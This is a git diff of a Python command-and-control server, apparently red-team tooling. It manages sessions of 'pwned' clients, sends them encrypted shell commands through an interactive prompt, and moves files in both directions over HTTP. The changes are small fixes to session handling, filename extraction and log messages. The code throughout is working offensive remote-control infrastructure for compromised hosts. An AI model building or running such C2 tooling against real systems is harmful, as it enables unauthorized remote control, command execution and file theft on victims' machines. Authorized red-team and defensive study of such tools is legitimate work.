@@ -9,7 +9,7 @@ from urllib.parse import unquote_plus
 from inputimeout import inputimeout, TimeoutOccurred
 from os import path, mkdir
 
-from c2_client import client
+
 from encryption import cipher
 # Settings Variables(Constants) Importing
 from settings import (CMD_REQUEST, CWD_RESPONSE, FILE_REQUEST, RESPONSE, RESPONSE_KEY, INPUT_TIMEOUT, KEEP_ALIVE_CMD,
@@ -21,9 +21,12 @@ def get_new_session():
     However, if sessions do exist, Allow the Red Team operator to pick one to become a new active session"""
 
     # this variable must be global, as they will often be updated via multiple session
-    global activeSession, pwnedDict, pwnedId
+    global activeSession, pwnedDict, pwnedId, cwd
     # Delete Lost Connection Client from pwnedDict
     del pwnedDict[activeSession]
+
+    # Reinitialize cwd to its starting value of tilde
+    cwd = "~"
 
     # If pwnedDict is empty, Re initialize pwnedId & activeSession
     if not pwnedDict:
@@ -109,6 +112,7 @@ class C2Handler(BaseHTTPRequestHandler):
                         # so we must handle input with a timeout as below
                         command = inputimeout(f"({clientIp}){clientAccount}@{clientHostname}:{cwd} => ",
                                               timeout=INPUT_TIMEOUT)
+
                     # if a timeout Occurs on our input, do a simple command to trigger a new session
                     except TimeoutOccurred:
                         command = KEEP_ALIVE_CMD
@@ -126,7 +130,6 @@ class C2Handler(BaseHTTPRequestHandler):
                     self.wfile.write(cipher.encrypt(command.encode()))
                 except BrokenPipeError:
                     # Print lost connection message
-                    cwd = "~"
                     print(Fore.RED + f"[!] Lost Connection to {pwnedDict[activeSession]}. \n" + Fore.RESET)
                     get_new_session()
                 # Handle KeyboardInterrupt
@@ -154,11 +157,11 @@ class C2Handler(BaseHTTPRequestHandler):
             # Split out the encrypted filepath from HTTP GET Request
             filepath = self.path.split(FILE_REQUEST)[1]
 
-            # Split out the filename from the filepath to use in Print Message
-            filename = path.basename(filepath)
-
             # Encode the file path because decrypt requires it, then decrypt and then decode it
             filepath = cipher.decrypt(filepath.encode()).decode()
+
+            # Get the filename from the filepath to using in a print statement
+            filename = path.basename(filepath)
 
             # Read the requested file into memory and stream it back for the client's GET Response
             try:
@@ -166,7 +169,7 @@ class C2Handler(BaseHTTPRequestHandler):
                     self.http_response(200)
                     self.wfile.write(cipher.encrypt(fileHandle.read()))
 
-                print(f"{filename} has been Downloaded on client from C2 Server")
+                print(f"[+] Server: {filename} has been Downloaded on C2 client from C2 Server.")
 
             except (FileNotFoundError, OSError):
                 print(f"{filepath} was not found on C2 Server.")
@@ -223,7 +226,7 @@ class C2Handler(BaseHTTPRequestHandler):
                 uploadData = cipher.decrypt(self.rfile.read(fileLength))
                 fileHandle.write(uploadData)
 
-            print(f"{incomingFile} has been Written on C2 Server")
+            print(f"[+] Server: {incomingFile} has been Written on C2 Server")
 
         # Nobody should ever get here using an HTTP Put method
         else:
